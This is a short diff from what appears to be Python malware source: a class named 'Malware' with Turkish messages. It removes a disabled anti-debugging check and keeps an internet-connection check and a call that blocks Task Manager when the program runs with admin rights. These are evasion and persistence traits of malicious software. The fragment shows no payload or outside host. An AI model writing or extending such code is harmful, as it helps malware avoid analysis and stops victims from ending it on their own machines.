@@ -211,9 +211,6 @@ class Malware:
             if not Checks.is_connected():
                 print('İnternet yok')
                 return
-             if False:  # Checks.is_debugged() devre dışı
-                print('algılanan hata ayıklayıcı')
-                return
             
             if Checks.is_admin():
                 self.block_task_manager()
